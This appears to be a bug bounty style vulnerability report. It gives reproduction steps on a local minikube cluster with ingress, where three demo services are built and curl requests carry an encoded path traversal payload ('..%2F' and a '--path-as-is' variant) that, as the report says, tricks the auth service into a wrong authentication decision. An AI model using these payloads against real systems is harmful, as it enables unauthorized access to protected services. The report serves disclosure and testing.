I have found a way to check this vulnerability on default docker driver for minikube.
Steps To Reproduce:
=================
* install minikube
* start minikube: `minikube start`
{F1490462}
* enable ingress: `minikube addons enable ingress`
{F1490464}
* add entry to /etc/hosts file: `127.0.0.1 app.test`
* check if cluster is fully operational: ` kubectl get pods -A`. You should get list of pods similar to this one:
{F1490465}
* build each docker image:

```cd auth-service; docker build -t auth-service:0.0.4 .```
{F1490467}
`cd protected-service; docker build -t protected-service:0.0.1 .`
{F1490468}
`cd public-service; docker build -t public-service:0.0.1 .`
{F1490470}

* load images to minikube (it's taking long time)

```
minikube image load auth-service:0.0.4
minikube image load protected-service:0.0.1
minikube image load public-service:0.0.1
```
{F1490477}
* apply kubernetes configuration: `kubectl apply -f app.yaml`
{F1490478}
* check if all pods are up and running: `kubectl get pods`
{F1490480}
* run minikube tunnel: `minikube tunnel`
{F1490481}
* in second terminal run: `curl -v http://app.test/public-service/..%2Fprotected-service/protected`
{F1490482}
* check logs from auth-service: 

```
kubectl get pods
kubectl logs auth-service-6df56d9bbb-ld8zz
```
{F1490483}
Headers are manipulated and wrong authentication decision is made.
* try second call: `curl --path-as-is -v http://app.test/public-service/../protected-service/protected`
